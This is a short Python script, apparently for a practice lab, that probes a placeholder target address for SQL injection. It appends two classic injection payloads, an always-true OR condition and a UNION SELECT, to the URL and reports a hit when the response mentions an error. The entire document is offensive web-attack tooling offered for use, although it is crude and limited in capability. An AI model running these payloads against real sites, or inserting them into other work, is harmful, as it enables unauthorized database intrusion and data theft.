#!/usr/bin/env python3
import requests
from urllib.parse import urljoin

def scan_sqli(target):
    payloads = ["' OR 1=1--", "' UNION SELECT NULL--"]
    for payload in payloads:
        resp = requests.get(f"{target}{payload}")
        if "error" in resp.text.lower():
            print(f"🔥 SQLi HIT: {payload}")
            
scan_sqli("http://10.10.10.x")
